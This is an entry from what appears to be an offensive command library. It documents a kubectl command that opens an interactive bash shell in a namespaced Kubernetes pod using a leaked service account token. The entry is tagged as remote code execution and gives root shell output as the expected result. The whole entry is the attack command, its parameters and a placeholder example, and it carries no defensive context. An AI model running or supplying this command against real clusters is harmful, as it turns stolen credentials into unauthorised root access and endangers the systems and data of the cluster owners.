---
data: >-
  kubectl --certificate-authority ca.crt --server https://███████ --token
  "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash
tags:
  - kubernetes
  - rce
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 255dc5dc-b3f1-4b88-a72d-aa05949a9039
created_at: '2025-12-11T06:10:23.189Z'
updated_at: '2025-12-11T06:10:23.189Z'
verified: false
validated: true
submitted: true
---
# kubectl-exec-pod-with-token-namespace

## Command

```bash
kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash
```

## Description

Executes bash in a pod in a specific namespace using a leaked token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--certificate-authority` | CA certificate file | Yes |
| `--server` | Kubernetes server URL | Yes |
| `--token` | Service account token | Yes |
| `exec -it ████████ -n ████████ -- /bin/bash` | Interactive exec in namespaced pod | Yes |

## Examples

### Basic Usage

```bash
kubectl --certificate-authority ca.crt --server https://k8s-server --token token-value exec -it my-pod -n namespace -- /bin/bash
```

## Expected Output

Root shell prompt, id showing uid=0(root).

## Related

- [[commands/kubectl-exec-pod-with-token]]
- [[procedures/Gain-Root-Shell-in-Kubernetes-Containers-Using-Service-Account-Token]]
